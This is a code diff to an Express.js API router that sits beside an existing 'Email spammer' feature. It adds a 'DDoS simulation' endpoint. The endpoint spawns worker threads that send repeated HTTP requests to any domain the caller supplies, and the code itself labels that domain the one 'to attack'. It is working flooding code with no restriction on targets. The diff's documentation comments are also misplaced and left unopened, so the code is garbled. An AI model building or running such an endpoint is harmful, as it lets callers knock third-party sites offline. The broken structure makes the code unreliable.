@@ -12,6 +12,7 @@ import path from "path";
 import { faker } from "@faker-js/faker";
 import verifyToken from "../../middleware/verifyToken.js";
 import dotenv from "dotenv";
+import { Worker, isMainThread, parentPort, workerData } from "worker_threads";
 dotenv.config();
 
 const publicRouter = express.Router();
@@ -319,6 +320,10 @@ publicRouter.post("/features/domain-info", verifyToken, async (req, res) => {
  *   post:
  *     summary: Email spammer
  *     description: Sends a certain number of emails to a given address with the provided content.
+ * /public/features/ddos-simulation:
+ *   post:
+ *     summary: Start DDoS simulation
+ *     description: Initiates a DDoS simulation against the specified domain using worker threads to send multiple requests.
  *     requestBody:
  *       required: true
  *       content:
@@ -461,4 +466,71 @@ publicRouter.post("/features/email-spammer", verifyToken, async (req, res) => {
   }
 });
 
+ *               domain:
+ *                 type: string
+ *                 description: Domain to attack
+ *               numWorkers:
+ *                 type: integer
+ *                 description: Number of worker threads to use
+ *               requestsPerWorker:
+ *                 type: integer
+ *                 description: Number of requests each worker should send
+ *     responses:
+ *       200:
+ *         description: DDoS simulation started
+ *         content:
+ *           application/json:
+ *             schema:
+ *               type: object
+ *               properties:
+ *                 message:
+ *                   type: string
+ */
+publicRouter.post(
+  "/features/ddos-simulation",
+  verifyToken,
+  async (req, res) => {
+    const { domain, numWorkers = 10, requestsPerWorker = 100 } = req.body;
+
+    if (!domain) {
+      return res.status(400).json({ message: "Domain is required." });
+    }
+
+    console.log("Target Domain: ", domain);
+
+    const workers = [];
+
+    for (let i = 0; i < numWorkers; i++) {
+      const worker = new Worker(new URL(import.meta.url), {
+        workerData: { domain, requestsPerWorker },
+      });
+
+      workers.push(worker);
+
+      worker.on("exit", (code) => {
+        console.log(`Worker exited with code ${code}`);
+      });
+    }
+
+    res.status(200).json({ message: `DDoS simulation started on ${domain}.` });
+  }
+);
+
+if (!isMainThread) {
+  const { domain, requestsPerWorker } = workerData;
+
+  const sendRequests = async () => {
+    for (let i = 0; i < requestsPerWorker; i++) {
+      try {
+        const response = await axios.get(domain);
+
+        console.log(`Request to ${domain}: ${response.status}`);
+      } catch (error) {
+        console.error(`Error hitting ${domain}: ${error.message}`);
+      }
+    }
+  };
+
+  sendRequests();
+}
 export default publicRouter;
